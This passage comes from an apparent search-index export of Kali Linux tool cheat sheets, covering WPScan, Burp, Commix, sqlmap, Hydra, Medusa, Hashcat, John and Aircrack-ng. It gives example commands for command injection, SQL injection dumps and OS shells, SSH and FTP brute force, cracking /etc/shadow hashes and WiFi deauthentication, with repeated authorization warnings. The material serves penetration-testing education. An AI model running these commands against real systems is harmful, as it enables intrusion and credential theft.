outputs","text":"<pre><code># Basic WPScan (passive, no token)\n$ wpscan --url http://example.com --enumerate u\n# Output snippet:\n# [+] Enumerated Users:\n#     - admin (ID: 1)\n#     - editor\n\n# Full scan with API token and plugin enumeration (recommended)\n$ wpscan --url https://example.com --enumerate p,t --api-token YOUR_TOKEN -o wpscan-report.txt\n# Output snippet:\n# [+] Found 67 Plugins\n# [+] Vulnerable plugin: revslider (CVE-2014-XXXX) - outdated\n# Report saved to wpscan-report.txt\n</code></pre> <p>WPScan Basics</p> <ul> <li>Register for a free API token at the WPScan website to avoid heavy rate-limiting.  </li> <li>WPScan focuses on known vulnerabilities \u2014 it won\u2019t find custom backdoors or unindexed issues.  </li> <li>Use <code>--enumerate</code> carefully; enumerating users/plugins can be noisy and may trigger protections.  </li> <li>Always have authorization before scanning third-party WordPress sites.</li> </ul>"},{"location":"Kali%20Tools/02%20-%20Vulnerability%20Analysis/WPScan/#wpscan-commands","title":"WPScan Commands","text":""},{"location":"Kali%20Tools/03%20-%20Web%20Explotation/Burp%20Suite/","title":"Burp Suite","text":""},{"location":"Kali%20Tools/03%20-%20Web%20Explotation/Burp%20Suite/#official-documentation-httpsportswiggernetburpdocumentation","title":"Official Documentation: https://portswigger.net/burp/documentation","text":""},{"location":"Kali%20Tools/03%20-%20Web%20Explotation/Burp%20Suite/#cheat-sheet-burp-suite-commands","title":"Cheat Sheet: Burp Suite Commands","text":""},{"location":"Kali%20Tools/03%20-%20Web%20Explotation/Burp%20Suite/#purpose","title":"Purpose","text":"<p>Burp Suite is a web-proxy and testing platform used to intercept, inspect, and modify HTTP(S) traffic between your browser and a web app. It also includes scanners, intruders, and many tools for manual and automated testing.</p>"},{"location":"Kali%20Tools/03%20-%20Web%20Explotation/Burp%20Suite/#scenarios","title":"Scenarios","text":"<ul> <li>CTF: Intercept requests to change parameters, replay requests, or fuzz inputs to find flags.  </li> <li>Real world: Perform full web app testing \u2014 proxy traffic, find injection points, scan for common vulnerabilities, and automate repetitive attacks.</li> </ul>"},{"location":"Kali%20Tools/03%20-%20Web%20Explotation/Burp%20Suite/#all-needed-info-to-run","title":"All needed info to run","text":"<ul> <li>GUI tool (Community or Professional). On Kali you can run <code>burpsuite</code> or the bundled launcher.  </li> <li>Configure your browser to use Burp as a proxy (default: 127.0.0.1:8080). Install Burp's CA certificate in your browser to intercept HTTPS.  </li> <li>Key modules:</li> <li>Proxy \u2014 intercept and modify requests/responses.  </li> <li>Repeater \u2014 resend and tweak individual requests manually.  </li> <li>Intruder \u2014 automate payloads (wordlists, fuzzing).  </li> <li>Scanner (Pro only) \u2014 automated vulnerability scanning.  </li> <li>Sequencer, Decoder, Comparer \u2014 helpers for tokens, encodings, diffs.  </li> <li>Useful file locations:</li> <li>Project files saved via GUI.  </li> <li>Use Burp extensions (BApp Store) for extra functionality.</li> </ul>"},{"location":"Kali%20Tools/03%20-%20Web%20Explotation/Burp%20Suite/#example-commands-outputs","title":"Example commands &amp; outputs","text":"<pre><code># Launch Burp Suite from terminal (Kali)\n$ burpsuite\n# GUI opens. Configure browser proxy to 127.0.0.1:8080 and install Burp CA.\n\n# Intercept a request in Proxy -&gt; HTTP history, send to Repeater, modify and resend.\n# Repeater output snippet (after sending modified POST):\n# HTTP/1.1 200 OK\n# Content-Type: application/json\n# {\"status\":\"success\",\"flag\":\"CTF{example_flag_1234}\"}\n\n# Use Intruder to fuzz a parameter with a wordlist (GUI-driven).\n# Intruder result table shows payload, status, length, matches \u2014 use length and status to spot interesting responses.\n</code></pre> <p>Burp Suite Basics</p> <ul> <li>Configure your browser to use Burp's proxy (127.0.0.1:8080) and install the Burp CA cert to intercept HTTPS safely.</li> <li>Community edition lacks the automated scanner and some Intruder features \u2014 Pro is faster for large tests.</li> <li>Use Repeater for manual testing and Intruder for automated payloads.</li> <li>Save projects and use Burp extensions (BApp store) to add functionality.</li> </ul>"},{"location":"Kali%20Tools/03%20-%20Web%20Explotation/Burp%20Suite/#burp-suite-commands","title":"Burp Suite Commands","text":""},{"location":"Kali%20Tools/03%20-%20Web%20Explotation/Commix/","title":"Commix","text":""},{"location":"Kali%20Tools/03%20-%20Web%20Explotation/Commix/#official-documentation-httpsgithubcomcommixprojectcommix","title":"Official Documentation: https://github.com/commixproject/commix","text":""},{"location":"Kali%20Tools/03%20-%20Web%20Explotation/Commix/#cheat-sheet-commix-commands","title":"Cheat Sheet: Commix Commands","text":""},{"location":"Kali%20Tools/03%20-%20Web%20Explotation/Commix/#purpose","title":"Purpose","text":"<p>Commix (Command Injection Exploiter) is an automated tool to test and exploit command injection vulnerabilities in web applications.</p>"},{"location":"Kali%20Tools/03%20-%20Web%20Explotation/Commix/#scenarios","title":"Scenarios","text":"<ul> <li>CTF: Automatically test parameters that may be vulnerable to OS command injection and attempt exploitation to get a reverse shell or run commands.  </li> <li>Real world: Quickly verify suspected injection points, but always confirm and exploit manually for safety and precision.</li> </ul>"},{"location":"Kali%20Tools/03%20-%20Web%20Explotation/Commix/#all-needed-info-to-run","title":"All needed info to run","text":"<ul> <li>Target URL with injectable parameter (GET or POST).  </li> <li>Optional proxy support (<code>--proxy</code>) to route via Burp.  </li> <li>Common flags:</li> <li><code>-u &lt;url&gt;</code> \u2192 target URL  </li> <li><code>--data=\"&lt;postdata&gt;\"</code> \u2192 POST data  </li> <li><code>--os-cmd=&lt;cmd&gt;</code> \u2192 run a single OS command  </li> <li><code>--dump</code> \u2192 attempt to dump file(s)  </li> <li><code>--technique=&lt;tech&gt;</code> \u2192 choose technique (e.g., classic, bash)  </li> <li><code>--proxy=http://127.0.0.1:8080</code> \u2192 route through proxy  </li> <li><code>--level</code>, <code>--risk</code> \u2192 adjust tests</li> <li>Network access to the target and permission to test.</li> </ul>"},{"location":"Kali%20Tools/03%20-%20Web%20Explotation/Commix/#example-commands-outputs","title":"Example commands &amp; outputs","text":"<pre><code># Basic test against a GET parameter\n$ commix -u \"http://192.168.56.101/vuln.php?cmd=test\" --batch\n# Output snippet:\n# [INFO] Testing 'cmd' parameter...\n# [VULNERABLE] The target is vulnerable to command injection (application/OS)\n# [INFO] Type 'shell' to spawn interactive shell, 'quit' to exit.\n\n# Run a single OS command\n$ commix -u \"http://example.com/vuln.php?cmd=test\" --os-cmd=\"id\"\n# Output:\n# uid=33(www-data) gid=33(www-data) groups=33(www-data)\n\n# Use proxy to inspect traffic\n$ commix -u \"http://example.com/vuln.php?cmd=test\" --proxy=http://127.0.0.1:8080 --batch\n</code></pre> <p>Commix Basics</p> <ul> <li>Commix automates exploitation \u2014 use <code>--batch</code> to skip prompts if you know what you want.</li> <li>Always confirm findings manually; automated exploitation can be noisy or unsafe.</li> <li>Use <code>--proxy</code> to route through Burp and inspect payloads.</li> <li>Get authorization before testing public/third-party sites.</li> </ul>"},{"location":"Kali%20Tools/03%20-%20Web%20Explotation/Commix/#commix-commands","title":"Commix Commands","text":""},{"location":"Kali%20Tools/03%20-%20Web%20Explotation/SQLmap/","title":"SQLmap","text":""},{"location":"Kali%20Tools/03%20-%20Web%20Explotation/SQLmap/#official-documentation-httpssqlmaporg","title":"Official Documentation: https://sqlmap.org/","text":""},{"location":"Kali%20Tools/03%20-%20Web%20Explotation/SQLmap/#cheat-sheet-sqlmap-commands","title":"Cheat Sheet: SQLmap Commands","text":""},{"location":"Kali%20Tools/03%20-%20Web%20Explotation/SQLmap/#purpose","title":"Purpose","text":"<p>sqlmap is an automated SQL injection tool that detects and exploits SQL injection flaws, enumerates databases, dumps data, and can provide a SQL shell.</p>"},{"location":"Kali%20Tools/03%20-%20Web%20Explotation/SQLmap/#scenarios","title":"Scenarios","text":"<ul> <li>CTF: Identify SQL injection points, dump database contents (tables, columns) to find flags.  </li> <li>Real world: Verify suspected injection vulnerabilities, enumerate DBs, and help prioritize fixes.</li> </ul>"},{"location":"Kali%20Tools/03%20-%20Web%20Explotation/SQLmap/#all-needed-info-to-run","title":"All needed info to run","text":"<ul> <li>Target URL with injectable parameter (GET/POST) or a request file (<code>-r request.txt</code>).  </li> <li>Common flags:</li> <li><code>-u &lt;url&gt;</code> \u2192 target URL  </li> <li><code>-p &lt;param&gt;</code> \u2192 parameter to test (optional)  </li> <li><code>--data=\"&lt;postdata&gt;\"</code> \u2192 POST data  </li> <li><code>-r &lt;reqfile&gt;</code> \u2192 use saved request file (Burp)  </li> <li><code>--dbs</code> \u2192 enumerate databases  </li> <li><code>--tables -D &lt;db&gt;</code> \u2192 list tables in database  </li> <li><code>--columns -D &lt;db&gt; -T &lt;table&gt;</code> \u2192 list columns  </li> <li><code>--dump -D &lt;db&gt; -T &lt;table&gt;</code> \u2192 dump table contents  </li> <li><code>--os-shell</code> / <code>--os-pwn</code> \u2192 attempt OS shell (dangerous; often needs file writes)  </li> <li><code>--proxy=http://127.0.0.1:8080</code> \u2192 route through Burp</li> <li>Use <code>-v</code> for verbosity. Use <code>--batch</code> to skip prompts.</li> </ul>"},{"location":"Kali%20Tools/03%20-%20Web%20Explotation/SQLmap/#example-commands-outputs","title":"Example commands &amp; outputs","text":"<pre><code># Basic test\n$ sqlmap -u \"http://192.168.56.101/item.php?id=1\" --batch\n# Output snippet:\n# [INFO] testing for SQL injection on parameter 'id'\n# [INFO] the back-end DBMS is MySQL\n# available databases [3]:\n# [0] information_schema\n# [1] users_db\n# [2] test_db\n\n# Enumerate tables in users_db\n$ sqlmap -u \"http://example.com/product.php?id=2\" --tables -D users_db\n# Output:\n# Database: users_db\n# +----------+\n# | users    |\n# | creds    |\n# +----------+\n\n# Dump data from a table\n$ sqlmap -u \"http://example.com/product.php?id=2\" --dump -D users_db -T users\n# Output snippet:\n# username: admin\n# password: $2y$10$encryptedhash\n</code></pre> <p>SQLmap Basics</p> <ul> <li>Use <code>-r</code> with a Burp request file for complex requests (auth, headers, cookies).</li> <li><code>--batch</code> automates choices but may make risky decisions; use carefully.</li> <li>SQLmap can be very noisy and disruptive \u2014 use only on allowed targets.</li> <li>Avoid <code>--os-shell</code>/<code>--os-pwn</code> on production targets unless you have permission.</li> </ul>"},{"location":"Kali%20Tools/03%20-%20Web%20Explotation/SQLmap/#sqlmap-commands","title":"SQLmap Commands","text":""},{"location":"Kali%20Tools/03%20-%20Web%20Explotation/ZAProxy/","title":"ZAProxy","text":""},{"location":"Kali%20Tools/03%20-%20Web%20Explotation/ZAProxy/#official-documentation-httpswwwzaproxyorgdocs","title":"Official Documentation: https://www.zaproxy.org/docs/","text":""},{"location":"Kali%20Tools/03%20-%20Web%20Explotation/ZAProxy/#cheat-sheet-zaproxy-commands","title":"Cheat Sheet: ZAProxy Commands","text":""},{"location":"Kali%20Tools/03%20-%20Web%20Explotation/ZAProxy/#purpose","title":"Purpose","text":"<p>ZAProxy (OWASP Zed Attack Proxy, ZAP) is an open-source web application proxy for finding vulnerabilities. It provides automated scanners, a proxy for manual inspection, and many plugins.</p>"},{"location":"Kali%20Tools/03%20-%20Web%20Explotation/ZAProxy/#scenarios","title":"Scenarios","text":"<ul> <li>CTF: Intercept requests, replay them, use the active scanner for quick checks, and find injection points or misconfigurations.  </li> <li>Real world: Use as a free alternative to Burp for automated scanning and manual testing workflows.</li> </ul>"},{"location":"Kali%20Tools/03%20-%20Web%20Explotation/ZAProxy/#all-needed-info-to-run","title":"All needed info to run","text":"<ul> <li>GUI or headless mode. On Kali, launch <code>owasp-zap</code> or <code>zap.sh</code>.  </li> <li>Configure your browser proxy to ZAP (default 127.0.0.1:8080) and install ZAP CA cert for HTTPS.  </li> <li>Key features:</li> <li>Spider \u2014 discover URLs.  </li> <li>Active Scanner \u2014 send attacks to find vulnerabilities.  </li> <li>Passive scanner \u2014 analyzes traffic without attacking.  </li> <li>Fuzzer, Breakpoints, Scripting plugins.  </li> <li>Headless mode uses <code>zap.sh -daemon -port 8080 -config ...</code> and the REST API for automation.</li> </ul>"},{"location":"Kali%20Tools/03%20-%20Web%20Explotation/ZAProxy/#example-commands-outputs","title":"Example commands &amp; outputs","text":"<pre><code># Launch ZAP GUI\n$ owasp-zap\n# GUI opens; set browser proxy to 127.0.0.1:8080 and import ZAP CA cert.\n\n# Launch ZAP in daemon (headless) mode\n$ zap.sh -daemon -port 8080 -host 127.0.0.1\n# Output snippet:\n# ZAP Daemon started and listening on 127.0.0.1:8080\n\n# Use the API or UI to run a quick active scan on a target\n# Active scanner output (UI): alerts list with risk (High/Medium/Low), URL, parameter, and description.\n</code></pre> <p>ZAProxy Basics</p> <ul> <li>Install and import ZAP's CA cert into your browser to intercept HTTPS safely.</li> <li>ZAP has a powerful API \u2014 use headless mode + API for automation and CI pipelines.</li> <li>Active scanning can be intrusive; run only on authorized targets.</li> <li>ZAP is a great free alternative to Burp for many workflows.</li> </ul>"},{"location":"Kali%20Tools/03%20-%20Web%20Explotation/ZAProxy/#zaproxy-commands","title":"ZAProxy Commands","text":""},{"location":"Kali%20Tools/04%20-%20Password%20Attacks/Cewl/","title":"Cewl","text":""},{"location":"Kali%20Tools/04%20-%20Password%20Attacks/Cewl/#official-documentation-httpsgithubcomdigininjacewl","title":"Official Documentation: https://github.com/digininja/CeWL","text":""},{"location":"Kali%20Tools/04%20-%20Password%20Attacks/Cewl/#cheat-sheet-cewl-commands","title":"Cheat Sheet: Cewl Commands","text":""},{"location":"Kali%20Tools/04%20-%20Password%20Attacks/Cewl/#purpose","title":"Purpose","text":"<p>Cewl (Custom Word List generator) spider a website to collect words and build a wordlist. It helps create targeted wordlists for password cracking based on site content.</p>"},{"location":"Kali%20Tools/04%20-%20Password%20Attacks/Cewl/#scenarios","title":"Scenarios","text":"<ul> <li>CTF: Generate a wordlist from a target\u2019s web pages (about pages, team bios) to crack weak passwords that use site-specific words.  </li> <li>Real world: Create custom dictionaries for targeted password audits instead of using huge generic lists.</li> </ul>"},{"location":"Kali%20Tools/04%20-%20Password%20Attacks/Cewl/#all-needed-info-to-run","title":"All needed info to run","text":"<ul> <li>Target URL (e.g., <code>http://example.com</code>).  </li> <li>Flags:</li> <li><code>-m &lt;minlen&gt;</code> \u2192 minimum word length (default 3)  </li> <li><code>-w &lt;file&gt;</code> \u2192 write output to file  </li> <li><code>-d &lt;depth&gt;</code> \u2192 crawl depth (how many link levels)  </li> <li><code>-u &lt;url&gt;</code> \u2192 start URL (alias)  </li> <li><code>-c</code> \u2192 count words and sort  </li> <li>Network access to the target. Use <code>--ua</code> to set a custom user-agent if needed.</li> </ul>"},{"location":"Kali%20Tools/04%20-%20Password%20Attacks/Cewl/#example-commands-outputs","title":"Example commands &amp; outputs","text":"<pre><code># Basic crawl and save wordlist\n$ cewl http://example.com -w example-words.txt\n# Output snippet:\n# [*] Crawling: http://example.com\n# [*] 234 words collected and saved in example-words.txt\n\n# Crawl with min length 5 and depth 2, count &amp; sort\n$ cewl -d 2 -m 5 -c http://example.com -w example-words-deep.txt\n# Output:\n# [*] 132 words (&gt;=5 chars) saved to example-words-deep.txt\n</code></pre> <p>Cewl Basics</p> <ul> <li>Cewl builds targeted wordlists from page content; it won't find passwords but it creates better dictionaries.</li> <li>Use <code>-d</code> conservatively \u2014 higher depth crawls more pages and takes longer.</li> <li>Combine Cewl output with <code>cewl</code> + <code>john</code>/<code>hashcat</code> or append to rockyou for hybrid attacks.</li> <li>Respect robots.txt and get permission before crawling production sites.</li> </ul>"},{"location":"Kali%20Tools/04%20-%20Password%20Attacks/Cewl/#cewl-commands","title":"Cewl Commands","text":""},{"location":"Kali%20Tools/04%20-%20Password%20Attacks/Hashcat/","title":"Hashcat","text":""},{"location":"Kali%20Tools/04%20-%20Password%20Attacks/Hashcat/#official-documentation-httpshashcatnethashcat","title":"Official Documentation: https://hashcat.net/hashcat/","text":""},{"location":"Kali%20Tools/04%20-%20Password%20Attacks/Hashcat/#cheat-sheet-hashcat-commands","title":"Cheat Sheet: Hashcat Commands","text":""},{"location":"Kali%20Tools/04%20-%20Password%20Attacks/Hashcat/#purpose","title":"Purpose","text":"<p>Hashcat is a high-performance password recovery tool that uses GPU acceleration to crack password hashes using many attack modes (dictionary, brute-force, rule-based, hybrid).</p>"},{"location":"Kali%20Tools/04%20-%20Password%20Attacks/Hashcat/#scenarios","title":"Scenarios","text":"<ul> <li>CTF: Crack dumped password hashes (MD5, bcrypt, NTLM) to get credentials or flags.  </li> <li>Real world: Authorized password recovery or offline credential audits using hash dumps from your environment.</li> </ul>"},{"location":"Kali%20Tools/04%20-%20Password%20Attacks/Hashcat/#all-needed-info-to-run","title":"All needed info to run","text":"<ul> <li>Hash type (e.g., MD5, NTLM, bcrypt). Hashcat uses mode numbers (see <code>hashcat --help</code> or online cheat-sheets).  </li> <li>Wordlists (e.g., <code>rockyou.txt</code>) or rules files.  </li> <li>GPU drivers installed (NVIDIA/CUDA or AMD/OpenCL) for best performance; CPU-only mode is possible but slow.  </li> <li>Common flags:</li> <li><code>-m &lt;hash-type&gt;</code> \u2192 hash mode (e.g., <code>0</code> for MD5, <code>1000</code> for NTLM)  </li> <li><code>-a &lt;attack-mode&gt;</code> \u2192 attack mode (<code>0</code> dict, <code>3</code> brute-force, <code>6</code> hybrid wordlist+mask, <code>7</code> mask+wordlist)  </li> <li><code>-o &lt;outfile&gt;</code> \u2192 save cracked results  </li> <li><code>--rules-file &lt;rulefile&gt;</code> \u2192 use rules  </li> <li><code>-w</code> \u2192 workload profile (1..4)</li> <li>Hash input formats: one hash per line, optional <code>salt</code> handling depending on algorithm.</li> </ul>"},{"location":"Kali%20Tools/04%20-%20Password%20Attacks/Hashcat/#example-commands-outputs","title":"Example commands &amp; outputs","text":"<pre><code># Basic dictionary attack (MD5 hashes)\n$ hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt -o cracked.txt\n# Output snippet:\n# Session..........: hashcat\n# Status...........: Cracked\n# Hash.Target......: hashes.txt\n# Cracked          : 3/3 (100.00%)\n\n# Brute-force with mask (lowercase letters, 6 chars)\n$ hashcat -m 1000 -a 3 ntlm_hashes.txt ?l?l?l?l?l?l\n# Output: tries combinations and reports cracked passwords\n\n# Hybrid: wordlist + mask (append 2 digits)\n$ hashcat -m 0 -a 6 hashes.txt rockyou.txt ?d?d\n</code></pre> <p>Hashcat Basics</p> <ul> <li>Know the correct <code>-m</code> mode for the hash type; wrong mode fails.</li> <li>GPU drivers must be installed correctly for high performance; use <code>hashcat -I</code> to list devices.</li> <li>Start with targeted wordlists and rules before brute-forcing; brute-force is slow for long passwords.</li> <li>Respect laws and only crack hashes you are authorized to test.</li> </ul>"},{"location":"Kali%20Tools/04%20-%20Password%20Attacks/Hashcat/#hashcat-commands","title":"Hashcat Commands","text":""},{"location":"Kali%20Tools/04%20-%20Password%20Attacks/Hydra/","title":"Hydra","text":""},{"location":"Kali%20Tools/04%20-%20Password%20Attacks/Hydra/#official-documentation-httpswwwkaliorgtoolshydratool-documentation","title":"Official Documentation: https://www.kali.org/tools/hydra/#tool-documentation","text":""},{"location":"Kali%20Tools/04%20-%20Password%20Attacks/Hydra/#cheat-sheet-hydra-commands","title":"Cheat Sheet: Hydra Commands","text":""},{"location":"Kali%20Tools/04%20-%20Password%20Attacks/Hydra/#purpose","title":"Purpose","text":"<p>Hydra is a fast network logon cracker that performs online password guessing (brute-force/dictionary) against many services (SSH, FTP, HTTP forms, RDP).</p>"},{"location":"Kali%20Tools/04%20-%20Password%20Attacks/Hydra/#scenarios","title":"Scenarios","text":"<ul> <li>CTF: Test default or guessable credentials on live services you control.  </li> <li>Real world: Authorized password-guessing tests (password spraying, credential stuffing) during a penetration test.</li> </ul>"},{"location":"Kali%20Tools/04%20-%20Password%20Attacks/Hydra/#all-needed-info-to-run","title":"All needed info to run","text":"<ul> <li>Target service and protocol (e.g., <code>ssh</code>, <code>ftp</code>, <code>http-form-post</code>).  </li> <li>Username(s) and password list(s).  </li> <li>Common flags:</li> <li><code>-l &lt;user&gt;</code> or <code>-L &lt;userlist&gt;</code> \u2192 single username or list  </li> <li><code>-p &lt;pass&gt;</code> or <code>-P &lt;passlist&gt;</code> \u2192 password or password list  </li> <li><code>-t &lt;tasks&gt;</code> \u2192 concurrent threads  </li> <li><code>-s &lt;port&gt;</code> \u2192 port (if non-standard)  </li> <li><code>-f</code> \u2192 exit when a valid pair is found  </li> <li><code>-V</code> \u2192 verbose  </li> <li>Many modules require service-specific syntax for form-based auth (see hydra help).</li> </ul>"},{"location":"Kali%20Tools/04%20-%20Password%20Attacks/Hydra/#example-commands-outputs","title":"Example commands &amp; outputs","text":"<pre><code># SSH login brute-force for single user using rockyou\n$ hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.101 -t 4 -f\n# Output snippet:\n# [22][ssh] host: 192.168.56.101   login: root   password: toor123\n\n# FTP with username list and password list\n$ hydra -L users.txt -P passwords.txt ftp://192.168.56.101 -t 6 -f\n\n# HTTP form example (syntax example)\n$ hydra -l admin -P passwords.txt 192.168.56.101 http-form-post \"/login.php:username=^USER^&amp;password=^PASS^:F=incorrect\"\n</code></pre> <p>Hydra Basics</p> <ul> <li>Hydra performs online attacks \u2014 be careful with rate limits and lockouts on real systems.</li> <li>For HTTP forms, exact form parameters and failure strings must be specified.</li> <li>Use <code>-t</code> to control concurrency; too high may crash services or trigger protections.</li> <li>Only run Hydra against systems you are authorized to test.</li> </ul>"},{"location":"Kali%20Tools/04%20-%20Password%20Attacks/Hydra/#hydra-commands","title":"Hydra Commands","text":""},{"location":"Kali%20Tools/04%20-%20Password%20Attacks/John/","title":"John","text":""},{"location":"Kali%20Tools/04%20-%20Password%20Attacks/John/#official-documentation-httpswwwopenwallcomjohn","title":"Official Documentation: https://www.openwall.com/john/","text":""},{"location":"Kali%20Tools/04%20-%20Password%20Attacks/John/#cheat-sheet-john-commands","title":"Cheat Sheet: John Commands","text":""},{"location":"Kali%20Tools/04%20-%20Password%20Attacks/John/#purpose","title":"Purpose","text":"<p>John the Ripper is a versatile password cracker for hashes and password files; it supports many formats and has builtin rules for smart guessing.</p>"},{"location":"Kali%20Tools/04%20-%20Password%20Attacks/John/#scenarios","title":"Scenarios","text":"<ul> <li>CTF: Crack password hashes from a captured file to retrieve credentials or flags.  </li> <li>Real world: Offline password audits of hashed credentials (shadow files, dumps) with wordlists and rules.</li> </ul>"},{"location":"Kali%20Tools/04%20-%20Password%20Attacks/John/#all-needed-info-to-run","title":"All needed info to run","text":"<ul> <li>Input file format: <code>john</code> auto-detects many formats; use <code>--format</code> if needed.  </li> <li>Wordlists (e.g., <code>rockyou.txt</code>) and <code>john</code> rules (in <code>john.conf</code>).  </li> <li>Common commands:</li> <li><code>john &lt;hashfile&gt;</code> \u2192 run with default wordlist/rules  </li> <li><code>john --wordlist=&lt;file&gt; --rules &lt;hashfile&gt;</code> \u2192 wordlist + rules  </li> <li><code>john --incremental</code> \u2192 brute-force with incremental mode  </li> <li><code>john --show &lt;hashfile&gt;</code> \u2192 show cracked passwords  </li> <li><code>unshadow /etc/passwd /etc/shadow &gt; mypasswd</code> \u2192 combine files for cracking (local lab only)</li> <li>Use <code>john --list=formats</code> to see supported hash types.</li> </ul>"},{"location":"Kali%20Tools/04%20-%20Password%20Attacks/John/#example-commands-outputs","title":"Example commands &amp; outputs","text":"<pre><code># Basic run with rockyou\n$ john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt\n# Output snippet:\n# Loaded 5 password hashes with 5 different salts (md5crypt)\n# Proceeding with Wordlist-based attack, rules: Single\n\n# Show cracked results\n$ john --show hashes.txt\n# user:password\n\n# Incremental brute-force (slow)\n$ john --incremental hashes.txt\n</code></pre> <p>John Basics</p> <ul> <li>John is great for format auto-detection; use <code>--format</code> if auto-detect fails.</li> <li>Use <code>unshadow</code> to combine passwd+shadow for local system password auditing (only on boxes you control).</li> <li>Try <code>--wordlist</code> + <code>--rules</code> before <code>--incremental</code> to save time.</li> <li>Respect authorization and laws \u2014 only crack hashes you own or are permitted to test.</li> </ul>"},{"location":"Kali%20Tools/04%20-%20Password%20Attacks/John/#john-commands","title":"John Commands","text":""},{"location":"Kali%20Tools/04%20-%20Password%20Attacks/Medusa/","title":"Medusa","text":""},{"location":"Kali%20Tools/04%20-%20Password%20Attacks/Medusa/#official-documentation-httpswwwkaliorgtoolsmedusa","title":"Official Documentation: https://www.kali.org/tools/medusa/","text":""},{"location":"Kali%20Tools/04%20-%20Password%20Attacks/Medusa/#cheat-sheet-medusa-commands","title":"Cheat Sheet: Medusa Commands","text":""},{"location":"Kali%20Tools/04%20-%20Password%20Attacks/Medusa/#purpose","title":"Purpose","text":"<p>Medusa is a parallel, modular login brute-forcer similar to Hydra, designed for speed and flexibility across many protocols.</p>"},{"location":"Kali%20Tools/04%20-%20Password%20Attacks/Medusa/#scenarios","title":"Scenarios","text":"<ul> <li>CTF: Rapidly test credentials against services in lab environments.  </li> <li>Real world: Use in authorized penetration tests for credential stuffing or multi-service testing.</li> </ul>"},{"location":"Kali%20Tools/04%20-%20Password%20Attacks/Medusa/#all-needed-info-to-run","title":"All needed info to run","text":"<ul> <li>Target service and module (e.g., <code>ssh</code>, <code>ftp</code>, <code>http</code>).  </li> <li>Username/password lists.  </li> <li>Common flags:</li> <li><code>-h &lt;host&gt;</code> \u2192 target host  </li> <li><code>-U &lt;userlist&gt;</code> \u2192 usernames file  </li> <li><code>-P &lt;passlist&gt;</code> \u2192 passwords file  </li> <li><code>-M &lt;module&gt;</code> \u2192 module/service name (e.g., <code>ssh</code>)  </li> <li><code>-t &lt;threads&gt;</code> \u2192 concurrent threads  </li> <li><code>-f</code> \u2192 stop on first found login  </li> <li>Check <code>medusa -H</code> for module list and syntax details.</li> </ul>"},{"location":"Kali%20Tools/04%20-%20Password%20Attacks/Medusa/#example-commands-outputs","title":"Example commands &amp; outputs","text":"<pre><code># SSH brute-force with medusa\n$ medusa -h 192.168.56.101 -U users.txt -P passwords.txt -M ssh -t 8 -f\n# Output snippet:\n# SUCCESS: 192.168.56.101:22 ssh - login: root password: toor123\n\n# FTP example\n$ medusa -h 192.168.56.101 -U users.txt -P passwords.txt -M ftp\n</code></pre> <p>Medusa Basics</p> <ul> <li>Medusa is fast and parallel \u2014 set <code>-t</code> carefully to avoid overwhelming targets.</li> <li>Use <code>-f</code> to stop after a success and save time.</li> <li>Modules differ in argument requirements; check medusa module docs.</li> <li>Only use Medusa on authorized targets and be mindful of lockouts.</li> </ul>"},{"location":"Kali%20Tools/04%20-%20Password%20Attacks/Medusa/#medusa-commands","title":"Medusa Commands","text":""},{"location":"Kali%20Tools/05%20-%20Wireless%20Attacks/Aircrack-ng/","title":"Aircrack ng","text":""},{"location":"Kali%20Tools/05%20-%20Wireless%20Attacks/Aircrack-ng/#official-documentation-httpswwwaircrack-ngorg","title":"Official Documentation: https://www.aircrack-ng.org/","text":""},{"location":"Kali%20Tools/05%20-%20Wireless%20Attacks/Aircrack-ng/#cheat-sheet-aircrack-ng-commands","title":"Cheat Sheet: Aircrack-ng Commands","text":""},{"location":"Kali%20Tools/05%20-%20Wireless%20Attacks/Aircrack-ng/#purpose","title":"Purpose","text":"<p>Aircrack-ng is a suite for auditing wireless networks. It captures packets, analyzes WPA/WPA2 handshakes, and cracks WEP/WPA-PSK keys using offline dictionary or brute-force attacks.</p>"},{"location":"Kali%20Tools/05%20-%20Wireless%20Attacks/Aircrack-ng/#scenarios","title":"Scenarios","text":"<ul> <li>CTF: Capture a WPA2 handshake from a target AP, then use a wordlist to try and recover the PSK that unlocks the network (flag).  </li> <li>Real world: Assess Wi-Fi security in a lab or authorized engagement by testing weak passphrases and misconfigured networks.</li> </ul>"},{"location":"Kali%20Tools/05%20-%20Wireless%20Attacks/Aircrack-ng/#all-needed-info-to-run","title":"All needed info to run","text":"<ul> <li>Wireless adapter that supports monitor mode (check with <code>iwconfig</code> / <code>airmon-ng</code>).  </li> <li>Common tools in suite: <code>airmon-ng</code>, <code>airodump-ng</code>, <code>aireplay-ng</code>, <code>aircrack-ng</code>.  </li> <li>Typical workflow:</li> <li><code>airmon-ng check kill</code> \u2192 stop interfering services.  </li> <li><code>airmon-ng start &lt;iface&gt;</code> \u2192 enable monitor mode (creates <code>mon0</code> or <code>wlan0mon</code>).  </li> <li><code>airodump-ng &lt;mon_iface&gt;</code> \u2192 scan and capture packets, find target BSSID/CH.  </li> <li><code>airodump-ng --bssid &lt;BSSID&gt; -c &lt;channel&gt; -w &lt;prefix&gt; &lt;mon_iface&gt;</code> \u2192 capture handshake to .cap file.  </li> <li>(Optional) <code>aireplay-ng --deauth 10 -a &lt;BSSID&gt; -c &lt;client&gt; &lt;mon_iface&gt;</code> \u2192 deauth client to force re-auth and capture handshake.  </li> <li><code>aircrack-ng -w &lt;wordlist&gt; -b &lt;BSSID&gt; &lt;capture&gt;.cap</code> \u2192 offline crack using wordlist.  </li> <li>File formats: capture files <code>.cap</code> / <code>.pcap</code>. Wordlists: <code>rockyou.txt</code> or custom.</li> </ul>"},{"location":"Kali%20Tools/05%20-%20Wireless%20Attacks/Aircrack-ng/#example-commands-outputs","title":"Example commands &amp; outputs","text":"<pre><code># Kill interfering services, enable monitor mode\n$ sudo airmon-ng check kill\n$ sudo airmon-ng start wlan0\n# Output:\n# (mon0) created by airmon-ng\n\n# Scan for APs and clients and start capture\n$ sudo airodump-ng mon0\n# Shows list of BSSIDs, channels, ESSIDs, clients\n\n# Capture only target BSSID on channel 6 and write to capture file\n$ sudo airodump-ng --bssid 00:11:22:33:44:55 -c 6 -w capture mon0\n# Output shows packets being saved to capture-01.cap\n\n# Optional: deauth a client to force handshake\n$ sudo aireplay-ng --deauth 10 -a 00:11:22:33:44:55 -c 66:77:88:99:AA:BB mon0\n# Output: 10 deauth packets sent\n\n# Crack with wordlist\n$ sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 00:11:22:33:44:55 capture-01.cap\n# Output 